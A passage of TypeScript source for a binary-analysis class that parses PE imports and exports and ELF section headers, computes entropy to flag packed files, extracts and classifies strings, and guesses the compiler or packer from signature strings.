                lines.push(`Import directory RVA 0x${importDirRva.toString(16)} could not be resolved.`);
                return lines.join('\n');
            }

            let idx = 0;
            let dllCount = 0;
            while (fileOffset + idx * 20 + 20 <= buf.length && dllCount < 50) {
                const entryOff = fileOffset + idx * 20;
                const nameRva = buf.readUInt32LE(entryOff + 12);
                if (nameRva === 0) break;

                const nameOffset = this.rvaToOffset(buf, peOffset, nameRva);
                if (nameOffset >= 0 && nameOffset < buf.length) {
                    let dllName = '';
                    for (let c = nameOffset; c < buf.length && buf[c] !== 0; c++) {
                        dllName += String.fromCharCode(buf[c]);
                        if (dllName.length > 128) break;
                    }
                    lines.push(`  ${dllName}`);
                    dllCount++;
                }
                idx++;
            }

            lines.unshift(lines.shift() + ` (${dllCount} DLLs)`);
        } catch (e: any) {
            lines.push(`Parse Error: ${e.message}`);
        }
        return lines.join('\n');
    }

    private analyzePeExports(buf: Buffer): string {
        const lines: string[] = ['[BINARY ANALYSIS — PE EXPORTS]'];
        try {
            const peOffset = buf.readUInt32LE(0x3C);
            const optMagic = buf.readUInt16LE(peOffset + 24);
            const is64 = optMagic === 0x20B;

            const exportDirRva = is64 ? buf.readUInt32LE(peOffset + 136) : buf.readUInt32LE(peOffset + 112);
            if (exportDirRva === 0) {
                lines.push('No export directory found.');
                return lines.join('\n');
            }

            const exportOff = this.rvaToOffset(buf, peOffset, exportDirRva);
            if (exportOff < 0 || exportOff + 40 > buf.length) {
                lines.push('Export directory could not be resolved.');
                return lines.join('\n');
            }

            const numFunctions = buf.readUInt32LE(exportOff + 20);
            const numNames = buf.readUInt32LE(exportOff + 24);
            const namesPtrRva = buf.readUInt32LE(exportOff + 32);

            lines.push(`Functions: ${numFunctions} | Named: ${numNames}`);

            const namesPtrOff = this.rvaToOffset(buf, peOffset, namesPtrRva);
            if (namesPtrOff >= 0) {
                for (let i = 0; i < Math.min(numNames, 40); i++) {
                    if (namesPtrOff + (i + 1) * 4 > buf.length) break;
                    const nameRva = buf.readUInt32LE(namesPtrOff + i * 4);
                    const nameOff = this.rvaToOffset(buf, peOffset, nameRva);
                    if (nameOff >= 0 && nameOff < buf.length) {
                        let name = '';
                        for (let c = nameOff; c < buf.length && buf[c] !== 0 && name.length < 128; c++) {
                            name += String.fromCharCode(buf[c]);
                        }
                        lines.push(`  [${i}] ${name}`);
                    }
                }
                if (numNames > 40) lines.push(`  ... (${numNames - 40} more)`);
            }
        } catch (e: any) {
            lines.push(`Parse Error: ${e.message}`);
        }
        return lines.join('\n');
    }

    private analyzeElfSections(buf: Buffer): string {
        const lines: string[] = ['[BINARY ANALYSIS — ELF SECTIONS]'];
        try {
            const bits = buf[4];
            if (bits !== 2) {
                lines.push('32-bit ELF section parsing — basic mode');
                return lines.join('\n');
            }

            const shOff = Number(buf.readBigUInt64LE(40));
            const shEntSize = buf.readUInt16LE(58);
            const shNum = buf.readUInt16LE(60);
            const shStrIdx = buf.readUInt16LE(62);

            // Read section name string table
            const strTabOff = shOff + shStrIdx * shEntSize;
            let strTabFileOff = 0;
            if (strTabOff + 64 <= buf.length) {
                strTabFileOff = Number(buf.readBigUInt64LE(strTabOff + 24));
            }

            lines.push(`${'Name'.padEnd(20)} ${'Type'.padEnd(12)} ${'Addr'.padEnd(18)} ${'Size'.padEnd(12)} Flags`);
            lines.push('─'.repeat(75));

            const shTypes: Record<number, string> = {
                0: 'NULL', 1: 'PROGBITS', 2: 'SYMTAB', 3: 'STRTAB', 4: 'RELA', 6: 'DYNAMIC',
                7: 'NOTE', 8: 'NOBITS', 9: 'REL', 11: 'DYNSYM', 14: 'INIT_ARRAY', 15: 'FINI_ARRAY'
            };

            for (let i = 0; i < Math.min(shNum, 40); i++) {
                const off = shOff + i * shEntSize;
                if (off + shEntSize > buf.length) break;

                const nameIdx = buf.readUInt32LE(off);
                const type = buf.readUInt32LE(off + 4);
                const flags = Number(buf.readBigUInt64LE(off + 8));
                const addr = buf.readBigUInt64LE(off + 16);
                const size = Number(buf.readBigUInt64LE(off + 32));

                let name = '';
                if (strTabFileOff > 0 && strTabFileOff + nameIdx < buf.length) {
                    for (let c = strTabFileOff + nameIdx; c < buf.length && buf[c] !== 0 && name.length < 32; c++) {
                        name += String.fromCharCode(buf[c]);
                    }
                }

                const flagStr: string[] = [];
                if (flags & 0x1) flagStr.push('W');
                if (flags & 0x2) flagStr.push('A');
                if (flags & 0x4) flagStr.push('X');

                lines.push(`${(name || `[${i}]`).padEnd(20)} ${(shTypes[type] || `?${type}`).padEnd(12)} 0x${addr.toString(16).padEnd(16)} 0x${size.toString(16).padEnd(10)} ${flagStr.join('')}`);
            }
        } catch (e: any) {
            lines.push(`Parse Error: ${e.message}`);
        }
        return lines.join('\n');
    }

    private analyzeEntropy(buf: Buffer, filePath: string, isPe: boolean, isElf: boolean): string {
        const lines: string[] = ['[BINARY ANALYSIS — ENTROPY]'];
        const globalEntropy = this.calcEntropy(buf);
        const packed = globalEntropy > 7.0;

        lines.push(`File:     ${filePath}`);
        lines.push(`Global:   ${globalEntropy.toFixed(4)} / 8.0`);
        lines.push(`Verdict:  ${packed ? '⚠️  HIGH ENTROPY — Likely Packed/Encrypted/Compressed' : '✅ NORMAL — Standard executable'}`);

        // Per-section entropy for PE
        if (isPe) {
            try {
                const peOffset = buf.readUInt32LE(0x3C);
                const numSections = buf.readUInt16LE(peOffset + 6);
                const optHeaderSize = buf.readUInt16LE(peOffset + 20);
                const sectionStart = peOffset + 24 + optHeaderSize;

                lines.push('');
                lines.push('── Per-Section Entropy ──');
                for (let i = 0; i < numSections && sectionStart + (i + 1) * 40 <= buf.length; i++) {
                    const off = sectionStart + i * 40;
                    const name = buf.slice(off, off + 8).toString('ascii').replace(/\0/g, '');
                    const rawSize = buf.readUInt32LE(off + 16);
                    const rawPtr = buf.readUInt32LE(off + 20);

                    if (rawSize > 0 && rawPtr + rawSize <= buf.length) {
                        const sectionEntropy = this.calcEntropy(buf.slice(rawPtr, rawPtr + rawSize));
                        const flag = sectionEntropy > 7.0 ? ' ⚠️  PACKED' : sectionEntropy > 6.5 ? ' ⚡ HIGH' : '';
                        lines.push(`  ${name.padEnd(10)} ${sectionEntropy.toFixed(4)}${flag}`);
                    }
                }
            } catch {}
        }

        return lines.join('\n');
    }

    private analyzeStrings(buf: Buffer): string {
        const lines: string[] = ['[BINARY ANALYSIS — STRINGS]'];

        // ASCII strings (printable, length >= 5)
        const asciiMatches = buf.toString('ascii').match(/[\x20-\x7E]{5,}/g) || [];

        // UTF-16LE strings
        const utf16Matches: string[] = [];
        for (let i = 0; i < buf.length - 10; i += 2) {
            let str = '';
            let j = i;
            while (j + 1 < buf.length) {
                const ch = buf.readUInt16LE(j);
                if (ch >= 0x20 && ch < 0x7F) {
                    str += String.fromCharCode(ch);
                    j += 2;
                } else break;
            }
            if (str.length >= 5) {
                utf16Matches.push(str);
                i = j; // skip past matched string
            }
        }

        // Classify strings
        const urls = asciiMatches.filter(s => /https?:\/\/|ftp:\/\//i.test(s));
        const paths = asciiMatches.filter(s => /^[A-Z]:\\|^\/[a-z]/i.test(s));
        const ips = asciiMatches.filter(s => /\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/.test(s));
        const emails = asciiMatches.filter(s => /[\w.-]+@[\w.-]+\.\w{2,}/.test(s));
        const registryKeys = asciiMatches.filter(s => /HKEY_|HKLM|HKCU|SOFTWARE\\/i.test(s));

        lines.push(`Total ASCII:  ${asciiMatches.length}`);
        lines.push(`Total UTF-16: ${utf16Matches.length}`);
        lines.push('');

        if (urls.length) {
            lines.push('── URLs ──');
            urls.slice(0, 15).forEach(s => lines.push(`  ${s}`));
        }
        if (ips.length) {
            lines.push('── IP Addresses ──');
            ips.slice(0, 10).forEach(s => lines.push(`  ${s}`));
        }
        if (paths.length) {
            lines.push('── File Paths ──');
            paths.slice(0, 15).forEach(s => lines.push(`  ${s}`));
        }
        if (emails.length) {
            lines.push('── Emails ──');
            emails.slice(0, 10).forEach(s => lines.push(`  ${s}`));
        }
        if (registryKeys.length) {
            lines.push('── Registry Keys ──');
            registryKeys.slice(0, 10).forEach(s => lines.push(`  ${s}`));
        }

        lines.push('');
        lines.push('── Interesting Strings (Top 30) ──');
        const interesting = asciiMatches.filter(s =>
            s.length > 8 && !urls.includes(s) && !paths.includes(s) && !ips.includes(s)
        );
        interesting.slice(0, 30).forEach(s => lines.push(`  ${s}`));

        if (utf16Matches.length) {
            lines.push('');
            lines.push('── UTF-16LE Strings (Top 15) ──');
            utf16Matches.slice(0, 15).forEach(s => lines.push(`  ${s}`));
        }

        return lines.join('\n');
    }

    private calcEntropy(data: Buffer): number {
        if (data.length === 0) return 0;
        const counts = new Array(256).fill(0);
        for (let i = 0; i < data.length; i++) counts[data[i]]++;
        let entropy = 0;
        for (let i = 0; i < 256; i++) {
            if (counts[i] > 0) {
                const p = counts[i] / data.length;
                entropy -= p * Math.log2(p);
            }
        }
        return entropy;
    }

    private detectCompiler(buf: Buffer): string {
        const ascii = buf.toString('ascii', 0, Math.min(buf.length, 65536));
        if (ascii.includes('Rich')) return 'Microsoft Visual C/C++ (Rich header detected)';
        if (ascii.includes('GCC:')) return `GCC (${(ascii.match(/GCC: \([^)]+\) [\d.]+/) || ['GCC'])[0]})`;
        if (ascii.includes('Go build')) return 'Go (Go build ID detected)';
        if (ascii.includes('rustc')) return 'Rust (rustc signature)';
        if (ascii.includes('Delphi') || ascii.includes('Borland')) return 'Borland Delphi';
        if (ascii.includes('.NET') || ascii.includes('mscoree.dll')) return '.NET / CLR';
        if (ascii.includes('UPX')) return 'UPX Packed';
        if (ascii.includes('VMProtect')) return 'VMProtect';
        if (ascii.includes('Themida')) return 'Themida/WinLicense';
        if (ascii.includes('ASPack')) return 'ASPack';
        if (ascii.includes('MPRESS')) return 'MPRESS';
        if (ascii.includes('Enigma')) return 'Enigma Protector';
        return '';
    }

    private rvaToOffset(buf: Buffer, peOffset: number, rva: number): number {
        const numSections = buf.readUInt16LE(peOffset + 6);
        const optHeaderSize = buf.readUInt16LE(peOffset + 20);
        const sectionStart = peOffset + 24 + optHeaderSize;

        for (let i = 0; i < numSections; i++) {
            const off = sectionStart + i * 40;
            if (off + 40 > buf.length) break;
            const virtAddr = buf.readUInt32LE(off + 12);
            const rawSize = buf.readUInt32LE(off + 16);
            const rawPtr = buf.readUInt32LE(off + 20);
            const virtSize = buf.readUInt32LE(off + 8);
            const size = virtSize > 0 ? virtSize : rawSize;

            if (rva >= virtAddr && rva < virtAddr + size) {
                return rawPtr + (rva - virtAddr);
            }
        }
        return -1;
    }
}
